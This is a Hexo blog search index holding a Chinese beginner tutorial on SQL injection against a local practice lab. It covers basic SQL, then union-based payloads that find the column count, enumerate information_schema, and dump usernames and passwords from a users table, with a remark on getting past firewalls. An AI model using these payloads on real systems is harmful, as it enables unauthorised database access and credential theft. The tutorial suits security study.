<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入基础(1)</title>
      <link href="/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="sql基本语句"><a href="#sql基本语句" class="headerlink" title="sql基本语句"></a>sql基本语句</h2><p>SQL（Structured Query Language）是用于操作关系数据库的标准语言。以下是一些基本的SQL语句：</p><p>创建表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    column3 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>插入数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, column3, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><p>查询数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>更新数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>删除数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>连接表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.column <span class="operator">=</span> table2.column;</span><br></pre></td></tr></table></figure><p>排序数据：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1 ASC/DESC;</span><br></pre></td></tr></table></figure><p>聚合函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 计算行数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 求和</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 平均值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 最大值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MIN</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 最小值</span></span><br></pre></td></tr></table></figure><h2 id="SQL注入五部曲"><a href="#SQL注入五部曲" class="headerlink" title="SQL注入五部曲"></a>SQL注入五部曲</h2><h3 id="1-查找注入点"><a href="#1-查找注入点" class="headerlink" title="1.查找注入点"></a>1.查找注入点</h3><p>例如，我们找的的注入点是?id&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1</span><br></pre></td></tr></table></figure><h3 id="2-判断是字符型还是数字型注入-and1-1-1-2-3-1"><a href="#2-判断是字符型还是数字型注入-and1-1-1-2-3-1" class="headerlink" title="2.判断是字符型还是数字型注入 and1&#x3D;1 1&#x3D;2&#x2F;3-1"></a>2.判断是字符型还是数字型注入 and1&#x3D;1 1&#x3D;2&#x2F;3-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1 and 1=1</span><br></pre></td></tr></table></figure><h3 id="3-如果字符型，找到他的闭合方式，’、”、’-、”"><a href="#3-如果字符型，找到他的闭合方式，’、”、’-、”" class="headerlink" title="3.如果字符型，找到他的闭合方式，’、”、’)、”)"></a>3.如果字符型，找到他的闭合方式，’、”、’)、”)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1&#x27;--+</span><br></pre></td></tr></table></figure><h3 id="4-判断查询列数-group-by、orderby"><a href="#4-判断查询列数-group-by、orderby" class="headerlink" title="4.判断查询列数 group by、orderby"></a>4.判断查询列数 group by、orderby</h3><p>利用group by或者order by x，用二分法缩小范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1&#x27; group by 3--+</span><br></pre></td></tr></table></figure><h3 id="5-查询回显位置，-1"><a href="#5-查询回显位置，-1" class="headerlink" title="5.查询回显位置，-1"></a>5.查询回显位置，-1</h3><p> 此时回显位就是2，3 然后我们可以在2，3上进行sql的代码注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><h2 id="利用SQL语句进行数据库查找"><a href="#利用SQL语句进行数据库查找" class="headerlink" title="利用SQL语句进行数据库查找"></a>利用SQL语句进行数据库查找</h2><h3 id="1-查找数据库表名信息"><a href="#1-查找数据库表名信息" class="headerlink" title="1.查找数据库表名信息"></a>1.查找数据库表名信息</h3><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231124235921355.png" alt="image-20231124235921355"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,table_name from information_schema.tables --+</span><br></pre></td></tr></table></figure><p>当然这个表是海量的，其中我们获取的table_name是下面图片的第三列，TABLE_SCHEMA是我们当前数据库对应的名字</p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125000447901.png" alt="image-20231125000447901"></p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125000720512.png" alt="image-20231125000720512"></p><p>为了查询我们需要的数据库下的表名，我们需要限定范围，有些防火墙加入database()更好绕过一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,table_name from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure><h3 id="2-group-concat-的作用"><a href="#2-group-concat-的作用" class="headerlink" title="2.group_concat()的作用"></a>2.group_concat()的作用</h3><p>确保所有查询的信息能放到一行显示出来</p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125001442029.png" alt="image-20231125001442029"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure><h3 id="3-查找数据库中数据表的列名"><a href="#3-查找数据库中数据表的列名" class="headerlink" title="3.查找数据库中数据表的列名"></a>3.查找数据库中数据表的列名</h3><p>所需要信息在数据库information_schema数据表columns数据列column_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database() --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002150571.png" alt="image-20231125002150571"></p><p>但此时列名也是有很多，但我们只想要<strong>数据表users</strong>里的名列名，因此我们加一点限制条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database()and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002414590.png" alt="image-20231125002414590"></p><h3 id="4-查询最终目标"><a href="#4-查询最终目标" class="headerlink" title="4.查询最终目标"></a>4.查询最终目标</h3><p>查询语句  select列名+from表名+where限定语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002720834.png" alt="image-20231125002720834"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
